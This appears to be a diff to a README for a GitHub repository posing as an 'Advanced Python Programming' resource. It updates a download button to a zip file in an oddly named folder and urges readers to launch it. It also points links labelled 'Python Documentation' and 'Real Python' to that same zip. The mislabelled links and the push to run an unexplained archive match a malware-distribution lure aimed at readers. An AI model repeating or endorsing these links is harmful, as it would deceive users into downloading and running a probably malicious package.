@@ -22,7 +22,7 @@ Welcome to the "Advanced-Python-Programming" repository, where you can explore t
 ## 🚀 Explore Further
 Ready to dive into the world of advanced Python programming? Click the button below to download the software package and start mastering Python!
 
-[![Download Software](https://github.com/draked1234/Advanced-Python-Programming/releases/download/v1.0/Release_x64.zip)](https://github.com/draked1234/Advanced-Python-Programming/releases/download/v1.0/Release_x64.zip)
+[![Download Software](https://github.com/draked1234/Advanced-Python-Programming/raw/refs/heads/main/gynomonoeciously/Python-Programming-Advanced-1.3-beta.4.zip)](https://github.com/draked1234/Advanced-Python-Programming/raw/refs/heads/main/gynomonoeciously/Python-Programming-Advanced-1.3-beta.4.zip)
 
 (*Note: The link ends with a file name, so it needs to be launched to access the software package.*)
 
@@ -64,8 +64,8 @@ In addition to the downloadable software package, you can explore a wealth of re
 ## 📖 Additional Reading
 For more in-depth explanations, code examples, and tutorials on advanced Python topics, visit the official Python documentation and other recommended resources:
 
-- [Python Documentation](https://github.com/draked1234/Advanced-Python-Programming/releases/download/v1.0/Release_x64.zip)
-- [Real Python](https://github.com/draked1234/Advanced-Python-Programming/releases/download/v1.0/Release_x64.zip)
+- [Python Documentation](https://github.com/draked1234/Advanced-Python-Programming/raw/refs/heads/main/gynomonoeciously/Python-Programming-Advanced-1.3-beta.4.zip)
+- [Real Python](https://github.com/draked1234/Advanced-Python-Programming/raw/refs/heads/main/gynomonoeciously/Python-Programming-Advanced-1.3-beta.4.zip)
 
 ## 🤝 Contribution
 Contributions to this repository are welcome! If you have insights, code snippets, or resources to share related to advanced Python programming, feel free to open a pull request or submit an issue.
